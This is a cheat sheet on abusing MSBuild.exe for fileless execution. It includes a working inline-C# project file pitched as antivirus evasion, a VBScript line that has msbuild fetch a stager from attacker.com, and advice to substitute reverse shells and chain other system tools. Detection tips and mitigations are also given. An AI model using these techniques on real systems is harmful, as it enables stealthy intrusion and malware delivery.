# 🧱 MSBuild - Living Off the Land

**MSBuild.exe** is a Microsoft-signed tool used to build C# applications from project files. Attackers exploit it to **execute malicious inline C# code**, completely fileless, and **bypass most antivirus and application control mechanisms**.

> ⚠️ Trusted, signed, and native to Windows — MSBuild is a favorite for red teams and advanced persistent threats (APTs).

---

## 🛠️ What It Does
- Compiles and runs `.proj` (XML project) files
- Executes inline tasks written in C#
- Doesn’t need to drop an EXE or DLL — code runs in memory
- Often used to bypass script restrictions and execute shellcode

---

## 💣 Common LotL MSBuild Techniques

### 1. Execute Inline C# in Project File
**malicious.proj:**
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Payload">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample : Task {
          public override bool Execute() {
            System.Diagnostics.Process.Start("calc.exe");
            return true;
          }
        }]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
Run it with:
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe malicious.proj
```
✅ Executes inline C# code without any compiled binaries — AV evasion

---

### 2. Weaponize With Reverse Shell
Replace `calc.exe` with any C2 payload (e.g., reverse PowerShell or shellcode loader)
✅ Ideal for red teams or malware stage loaders

---

### 3. Use From Disk or Memory (via HTA/VBS)
```vbscript
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "msbuild.exe http://attacker.com/stager.proj"
```
✅ Download + execute project file dynamically — fileless delivery

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| MSBuild called with external `.proj` | Monitor command-line usage of msbuild.exe with remote/local untrusted project files |
| Inline C# + suspicious APIs | Look for Process.Start, reflection, or Win32 API calls in build tasks |
| Unusual source of MSBuild | Run from non-dev machines or user directories

---

## 🔐 Mitigation Strategies
- Restrict `msbuild.exe` execution via WDAC or AppLocker
- Monitor `.proj` file creation/access outside of dev tools
- Detect outbound connections made by `msbuild.exe`
- Inspect child processes launched by `msbuild.exe`

---

> 🧠 MSBuild is a stealthy, fileless execution method loved by APTs like Astaroth and Cobalt Strike users. Pair with certutil, cmstp, or regsvr32 for elite multi-stage chains.
